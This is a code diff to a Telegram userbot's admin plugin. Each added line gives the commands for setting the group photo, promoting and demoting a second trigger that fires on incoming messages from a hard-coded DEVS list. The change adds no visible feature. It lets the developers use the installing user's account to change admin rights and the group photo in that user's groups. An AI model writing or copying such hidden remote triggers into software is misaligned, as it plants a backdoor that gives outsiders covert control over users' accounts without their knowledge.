@@ -80,6 +80,7 @@ UNMUTE_RIGHTS = ChatBannedRights(until_date=None, send_messages=False)
 
 
 @skyzu_cmd(pattern="setgpic$")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.csetgcpic(?: |$)(.*)")
 async def set_group_photo(gpic):
     if not gpic.is_group:
         await gpic.edit("`Mohon Lakukan Perintah Ini Di Grup.`")
@@ -116,6 +117,7 @@ async def set_group_photo(gpic):
 
 
 @skyzu_cmd(pattern="promote(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpromote(?: |$)(.*)")
 async def promote(promt):
     # Get targeted chat
     chat = await promt.get_chat()
@@ -166,6 +168,7 @@ async def promote(promt):
 
 
 @skyzu_cmd(pattern="demote(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cdemote(?: |$)(.*)")
 async def demote(dmod):
     # Admin right check
     chat = await dmod.get_chat()
